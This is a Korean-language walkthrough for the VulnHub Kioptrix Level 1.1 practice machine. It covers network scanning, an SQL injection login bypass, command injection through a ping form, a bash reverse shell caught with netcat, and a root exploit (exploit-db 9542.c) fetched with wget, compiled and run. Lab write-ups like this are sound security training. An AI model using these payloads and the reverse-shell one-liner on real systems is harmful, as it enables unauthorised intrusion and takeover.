[Kioptrix : Level 1.1](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)
# targetdiscovery
***
### nmap -sn 192.168.25.8-255 --open   
![1 1캡처](https://user-images.githubusercontent.com/69203345/108843882-a2f51800-761e-11eb-9dc9-fd85370f1708.PNG)   
# enumerate
***
## target: 192.168.25.15
### nmap -O -sV -sS -p- 192.168.25.15   
![1 1 2캡처](https://user-images.githubusercontent.com/69203345/108844085-f5363900-761e-11eb-9741-9d0f492202f9.PNG)   
80/tcp 열려 있으니까   
들어가봄   
![1 1 3캡처](https://user-images.githubusercontent.com/69203345/108844281-3dedf200-761f-11eb-9499-b39a4b4665c7.PNG)   

# exploitation 
***
#### id = admin'-- 
#### pw = '   
### sql injection 시도
성공    
![1 1 4캡처](https://user-images.githubusercontent.com/69203345/108844554-9de49880-761f-11eb-99ba-083415d62bb2.PNG)     
www.google.com 에 핑 보내봄   
![1 1 5캡처](https://user-images.githubusercontent.com/69203345/108844918-1186a580-7620-11eb-8a44-227b980ee331.PNG)
### 결과
![1 1 6캡처](https://user-images.githubusercontent.com/69203345/108844944-1fd4c180-7620-11eb-9a12-79d06ae63cdd.PNG)
### command injection 시도
성공    
![1 1 7캡처](https://user-images.githubusercontent.com/69203345/108845167-6c200180-7620-11eb-83dd-62cee6a1d076.PNG)    
아래 ls에 대한 내용을 확인할수 있다   
### bash reverse shell을 command injection 
#### bash -i >& /dev/tcp/lhost/lport 0>&1
lhost 에는 자신의 ip를   
lport 에는 열어놓을 port를 적으면 된다   
### nc -nvlp 1234 실행후 apache로 접속 된것을 확인 할 수 있다
![1 1 8캡처](https://user-images.githubusercontent.com/69203345/108849640-bd7ebf80-7625-11eb-8a8b-6f0f82f85d84.PNG)
### lsb_release -a 
배포판 버전을 확인할 수 있다   
![1 1 9캡처](https://user-images.githubusercontent.com/69203345/108847106-a25e8080-7622-11eb-8286-a015b5ff3e0b.PNG)   
### searchsploit centos 4.5
![1 1 10캡처](https://user-images.githubusercontent.com/69203345/108847221-cd48d480-7622-11eb-8ad8-35136a626f6c.PNG)   

# privilege escalation 
***
searchsploit centos4.5 로 확인한 것들중 9542.c 복사
cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c ./   
이번엔 파일을 가져와서 실행 
### python -m simplehttpserver 

### wget ip:8000/파일이름
cd /tmp 실행후 wget 실행후 파일 확인   
![1 1 12캡처](https://user-images.githubusercontent.com/69203345/108848486-63c9c580-7624-11eb-8482-d5f5988140c5.PNG)   
파일 받으면 python 서버는 닫아도 괜찮다
### gcc -o exploit 9542.c
### ./exploit 실행
root획득   
꼭 이방법만 있는것은 아니다.
